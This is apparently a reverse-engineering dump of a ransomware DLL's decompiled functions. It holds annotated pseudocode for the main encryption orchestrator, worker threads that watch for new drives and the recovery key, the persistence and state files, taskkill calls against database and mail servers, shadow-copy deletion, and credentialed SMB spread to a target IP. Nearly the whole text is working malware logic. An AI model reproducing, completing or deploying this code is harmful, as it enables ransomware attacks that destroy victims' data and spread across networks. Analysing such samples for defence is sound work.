// payload.dll batch 2 — workers, persistence triggers, main encryption orchestrator, /f spread

// ===== 0x10004800 sub_10004800 — read .res state (136 bytes) =====
int sub_10004800() {
  FileA = CreateFileA(Buffer, 0x80000000, 1u, nullptr, 3u, 0, nullptr);
  if ( FileA == (HANDLE)-1 ) return 0;
  ReadFile(FileA, &pbBuffer, 0x88u, &NumberOfBytesRead, nullptr); CloseHandle(FileA); return 136;
}

// ===== 0x10004640 sub_10004640 — CryptGenRandom wrapper =====
BOOL __thiscall sub_10004640(HCRYPTPROV *this, BYTE *pbBuffer, DWORD dwLen) {
  return CryptGenRandom(*(this + 1), dwLen, pbBuffer);
}

// ===== 0x10003de0 sub_10003DE0 — crypto dtor: destroy keys, release context =====
int __thiscall sub_10003DE0(HCRYPTPROV *this) {
  if (*(this+2)) { CryptDestroyKey(*(this+2)); *(this+2)=0; }
  if (*(this+3)) { CryptDestroyKey(*(this+3)); *(this+3)=0; }
  if (*(this+1)) { CryptReleaseContext(*(this+1), 0); *(this+1)=0; }
  return 1;
}

// ===== 0x100048c0 sub_100048C0 — res-file heartbeat worker =====
void __stdcall __noreturn sub_100048C0(LPVOID lpThreadParameter) {
  while ( dword_1000F2DC == 0 ) {
    dword_1000F25C = time(nullptr);
    sub_10004860();  // write .res
    for ( i = 0; i < 25; ++i ) { if ( dword_1000F2DC != 0 ) goto LABEL_6; Sleep(0x3E8u); }
  }
LABEL_6: ExitThread(0);
}

// ===== 0x10004860 sub_10004860 — write .res state (136 bytes) =====
int sub_10004860() {
  FileA = CreateFileA(Buffer, 0x40000000u, 1u, nullptr, 4u, 0x80u, nullptr);
  if ( FileA == (HANDLE)-1 ) return 0;
  WriteFile(FileA, &pbBuffer, 0x88u, &NumberOfBytesWritten, nullptr); CloseHandle(FileA); return 136;
}

// ===== 0x10004730 sub_10004730 — poll for .dky recovery key appearance =====
void __stdcall __noreturn sub_10004730(LPVOID lpThreadParameter) {
  while ( 1 ) {
    dword_1000F2D8 = sub_10004660((int)lpThreadParameter);
    if ( dword_1000F2D8 != 0 ) break;
    Sleep(0x1388u);
  }
  ExitThread(0);
}

// ===== 0x10005720 sub_10005720 — watch for newly mounted drives =====
void __stdcall __noreturn sub_10005720(LPVOID lpThreadParameter) {
  LogicalDrives = GetLogicalDrives();
  if ( dword_1000F2D8 == 0 ) {
    while ( 1 ) {
      Sleep(0xBB8u);
      v2 = LogicalDrives; LogicalDrives = GetLogicalDrives();
      if ( LogicalDrives != v2 ) break;
LABEL_10: if ( dword_1000F2D8 != 0 ) goto LABEL_11;
    }
    v3 = 2;
    while ( dword_1000F2D8 == 0 ) {
      if ( (((LogicalDrives ^ v2) >> v3) & 1) != 0 && ((v2 >> v3) & 1) == 0 ) {  // new drive appeared
        Thread = CreateThread(nullptr, 0, sub_10005670, (LPVOID)v3, 0, nullptr);
        if ( Thread != nullptr ) CloseHandle(Thread);
      }
      if ( ++v3 >= 26 ) goto LABEL_10;
    }
  }
LABEL_11: ExitThread(0);
}

// ===== 0x100049b0 sub_100049B0 — decryptor GUI watchdog =====
void __stdcall __noreturn sub_100049B0(LPVOID lpThreadParameter) {
  if ( FindWindowW(nullptr, WindowName) == nullptr ) {
    while ( 1 ) {
      if ( dword_1000F260 > 0 && time(nullptr) >= dword_1000EFAC ) sub_10004920();  // timer escalation
      Sleep(0x1388u);
    }
  }
  ExitThread(0);
}

// ===== 0x100058c0 sub_100058C0 — MAIN ENCRYPTION ORCHESTRATOR =====
int sub_100058C0() {
  sub_100017A0(Parameter); v10 = 0;
  if ( sub_10001A70(Parameter, (HCRYPTKEY)FileName, (int)sub_10005290, (int)&dword_1000F2D8) != 0 ) {
    if ( GetFileAttributesA(aFWry) == -1 ) sub_10001B40(10, 100);  // wallpaper
    if ( dword_1000F248 == 0 ) {
      dword_1000F248 = time(nullptr); sub_10004860();
      sprintf(Buffer, "%s f", NewFileName); sub_10001000(Buffer, 0, nullptr);  // decryptor /f
    }
    sub_100053C0(Parameter);  // encrypt cwd/shares first
    while ( dword_1000F2D8 == 0 ) {
      InterlockedExchange(&Target, -1);
      sub_10001000(CommandLine, 0, nullptr);       // cmd
      sub_10001000(aTaskkillFImMic, 0, nullptr);   // taskkill MSSQL/Exchange/MySQL etc strings
      sub_10001000(aTaskkillFImSql, 0, nullptr);
      sub_10001000(aTaskkillFImSql_0, 0, nullptr);
      LogicalDrives = GetLogicalDrives();
      for ( i = 0; i < 2; ++i ) {  // pass 0: network drives first, pass 1: others
        for ( j = 25; j >= 2; --j ) { // Z: down to C:
          RootPathName = letter+":\\";
          if ( dword_1000F2D8 != 0 ) break;
          if ( ((LogicalDrives >> j) & 1) != 0 ) {
            if ( i != 0 ) { if ( i == 1 && GetDriveTypeW(...) != 4 ) continue; LABEL_16: sub_10005530(Parameter, j, 1); continue; }
            if ( GetDriveTypeW(...) != 4 ) goto LABEL_16;
          }
        }
      }
      InterlockedExchange(&Target, -1);
      v3 = dword_1000F260 == 0;
      dword_1000F260 = time(nullptr); sub_10004860();
      sub_10004A10(25, (int)sub_10004EE0, 0);  // enumerate shares, encrypt
      if ( GetFileAttributesA(aNWry) == -1 ) { sprintf(Buffer, "%s c", NewFileName); sub_10001000(Buffer, 0, nullptr); }
      if ( v3 ) {
        sprintf(Buffer, "cmd.exe /c start /b %s v", NewFileName); sub_10001000(Buffer, 0, nullptr); // decryptor /v
        sub_10005120(2);
        for ( k = 25; k > 2; --k ) {  // local fixed drives: shadow copy delete + cleanup
          if ( dword_1000F2D8 != 0 ) break;
          if ( ((LogicalDrives >> k) & 1) != 0 ) { v7 = letter+":\\"; if ( GetDriveTypeW(...) == 3 ) sub_10005120(k); }
        }
      }
      Sleep(0xEA60u);  // 60s
    }
  }
  v10 = -1; return sub_100018A0(...);
}

// ===== 0x100057b0 sub_100057B0 — /f <ip> targeted SMB encryption =====
int __cdecl sub_100057B0(struct in_addr in, LPCSTR lpUserName, LPCSTR lpPassword) {
  sub_100017A0(Parameter); v9 = 0;
  if ( sub_10001A70(Parameter, (HCRYPTKEY)FileName, (int)sub_10005290, (int)&dword_1000F2D8) != 0 ) {
    WSAStartup(0x202u, &WSAData);
    v3 = sub_10001350(in, (int)MultiByteStr);   // connect
    v4 = sub_10001390(v3, lpUserName, lpPassword);  // auth
    sub_10001470((LPCCH)MultiByteStr, (int)sub_10005480, (int)Parameter, 0); // enumerate shares, encrypt
    if ( v4 != 0 ) { sub_10001440(MultiByteStr); }  // disconnect
    else if ( dword_1000F264 == 0 ) { LABEL_6: WSACleanup(); goto LABEL_7; }
    dword_1000F260 = time(nullptr); goto LABEL_6;
  }
LABEL_7: v9 = -1; return sub_100018A0(...);
}
